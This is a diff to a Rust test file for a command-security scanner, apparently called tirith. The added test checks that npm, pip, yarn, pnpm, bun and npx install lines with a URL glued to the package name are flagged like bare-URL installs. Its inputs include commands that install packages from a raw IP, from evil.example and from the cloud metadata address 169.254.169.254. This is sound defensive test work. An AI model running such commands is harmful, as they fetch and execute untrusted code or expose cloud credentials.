@@ -9,9 +9,18 @@ use tirith_core::verdict::{Action, RuleId, Verdict};
 use tirith_test_support::GlobalStateGuard;
 
 fn analyze(input: &str, scan_context: ScanContext, force_full: bool) -> Verdict {
+    analyze_in(input, ShellType::Posix, scan_context, force_full)
+}
+
+fn analyze_in(
+    input: &str,
+    shell: ShellType,
+    scan_context: ScanContext,
+    force_full: bool,
+) -> Verdict {
     let ctx = AnalysisContext {
         input: input.into(),
-        shell: ShellType::Posix,
+        shell,
         scan_context,
         raw_bytes: (scan_context == ScanContext::Paste).then(|| input.as_bytes().to_vec()),
         interactive: false,
@@ -682,4 +691,173 @@ fn escaped_bang_command_word_is_analyzed_like_the_negation_keyword() {
             .any(|finding| finding.rule_id == RuleId::BlastWritesSystemPath),
         "{input:?}: {verdict:?}"
     );
+}
+
+/// A scheme URL glued to a package name or config key (`pkg@http://...`,
+/// `--@scope:registry=http://...`) is a destination: npm-package-arg, pip's
+/// `packaging` and `@npmcli/config` read it so. URL extraction used to stop at
+/// an SCP reading with host `http`, so the line got none of the bare URL's
+/// findings; it now gets exactly those.
+#[test]
+fn scheme_urls_glued_to_package_specs_get_their_bare_url_findings() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for (glued, bare, shell) in [
+        (
+            "npm install pkg@http://4.1.0.11/x.tgz",
+            "npm install http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "yarn add pkg@http://4.1.0.11/x.tgz",
+            "yarn add http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "pnpm add pkg@http://4.1.0.11/x.tgz",
+            "pnpm add http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "bun add pkg@http://4.1.0.11/x.tgz",
+            "bun add http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "pip install pkg@http://4.1.0.11/x.tgz",
+            "pip install http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "uv pip install pkg@http://4.1.0.11/x.tgz",
+            "uv pip install http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "npm install pkg@http://evil.example/x.tgz",
+            "npm install http://evil.example/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "npm install pkg@http://169.254.169.254/latest/meta-data",
+            "npm install http://169.254.169.254/latest/meta-data",
+            ShellType::Posix,
+        ),
+        (
+            "pip install pkg@HTTP://4.1.0.11/x.tgz",
+            "pip install HTTP://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "npx pkg@http://4.1.0.11/x.tgz",
+            "npx http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "pnpm dlx pkg@http://4.1.0.11/x.tgz",
+            "pnpm dlx http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "npm install @scope/pkg@http://4.1.0.11/x.tgz",
+            "npm install http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "npm view pkg@http://4.1.0.11/x.tgz",
+            "npm view http://4.1.0.11/x.tgz",
+            ShellType::Posix,
+        ),
+        (
+            "npm install pkg@http://4.1.0.11/x.tgz",
+            "npm install http://4.1.0.11/x.tgz",
+            ShellType::Fish,
+        ),
+        (
+            "npm install pkg@http://4.1.0.11/x.tgz",
+            "npm install http://4.1.0.11/x.tgz",
+            ShellType::PowerShell,
+        ),
+        (
+            "npm install --@scope:registry=http://4.1.0.11/ pkg",
+            "npm install --@scope:registry http://4.1.0.11/ pkg",
+            ShellType::Posix,
+        ),
+    ] {
+        for force_full in [false, true] {
+            let bare_verdict = analyze_in(bare, shell, ScanContext::Exec, force_full);
+            let glued_verdict = analyze_in(glued, shell, ScanContext::Exec, force_full);
+            assert!(
+                bare_verdict.findings.iter().any(|finding| matches!(
+                    finding.rule_id,
+                    RuleId::RawIpUrl | RuleId::PlainHttpToSink
+                )),
+                "{bare:?} ({shell:?}): {bare_verdict:?}"
+            );
+            assert_eq!(
+                glued_verdict.action, bare_verdict.action,
+                "{glued:?} ({shell:?}): {glued_verdict:?}"
+            );
+            assert_eq!(
+                rule_ids(&glued_verdict),
+                rule_ids(&bare_verdict),
+                "{glued:?} ({shell:?}): {glued_verdict:?}"
+            );
+            assert_eq!(
+                glued_verdict.findings.len(),
+                bare_verdict.findings.len(),
+                "{glued:?} ({shell:?}) doubled a finding: {glued_verdict:?}"
+            );
+        }
+    }
+
+    // A real SCP remote keeps its SCP reading.
+    for input in [
+        "git clone git@github.com:org/repo.git",
+        "git clone git@github.com:http://4.1.0.11/repo.git",
+    ] {
+        let verdict = analyze(input, ScanContext::Exec, true);
+        assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
+    }
+    let input = "git clone git@4.1.0.11:repo.git";
+    let verdict = analyze(input, ScanContext::Exec, true);
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::RawIpUrl),
+        "{input:?}: {verdict:?}"
+    );
+    // git itself reads `pkg@http://...` as an SCP host named `http`; the
+    // glued URL is flagged anyway, as for any other command.
+    let input = "git clone pkg@http://4.1.0.11/x";
+    let verdict = analyze(input, ScanContext::Exec, true);
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::RawIpUrl),
+        "{input:?}: {verdict:?}"
+    );
+
+    // Registry specs carry no URL.
+    for input in [
+        "npm install pkg@1.2.3",
+        "npm install @scope/pkg@latest",
+        "pip install pkg==1.0",
+    ] {
+        for force_full in [false, true] {
+            let verdict = analyze(input, ScanContext::Exec, force_full);
+            assert!(
+                verdict.findings.iter().all(|finding| !matches!(
+                    finding.rule_id,
+                    RuleId::RawIpUrl
+                        | RuleId::PlainHttpToSink
+                        | RuleId::NpmUrlInstall
+                        | RuleId::PipUrlInstall
+                        | RuleId::SchemelessToSink
+                )),
+                "{input:?}: {verdict:?}"
+            );
+        }
+    }
 }
